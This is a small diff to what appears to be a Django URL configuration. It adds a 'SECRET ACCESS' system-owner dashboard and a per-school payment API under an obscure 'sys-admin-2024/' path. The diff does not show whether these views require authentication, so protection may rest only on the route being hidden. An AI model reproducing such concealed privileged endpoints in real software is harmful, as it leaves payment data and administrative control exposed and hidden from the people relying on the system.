@@ -7,6 +7,7 @@ from django.shortcuts import redirect
 from django.http import HttpResponse, Http404
 from django.core.cache import cache
 from system_security_check import system_security_audit
+from system_owner_panel import system_owner_dashboard, school_payment_api
 
 def health_check(request):
     """Health check endpoint - no DB queries"""
@@ -41,6 +42,10 @@ urlpatterns = [
     
     # Core apps - ONLY ESSENTIAL FOR FUNCTIONALITY
     path('accounts/', include('accounts.urls')),
+    
+    # SYSTEM OWNER PANEL - SECRET ACCESS
+    path('sys-admin-2024/', system_owner_dashboard, name='system_owner_dashboard'),
+    path('sys-admin-2024/payment-api/<int:school_id>/', school_payment_api, name='school_payment_api'),
     
     # TEMPORARILY DISABLED TO FIX 500 ERRORS
     # path('core/', include('core.urls')),
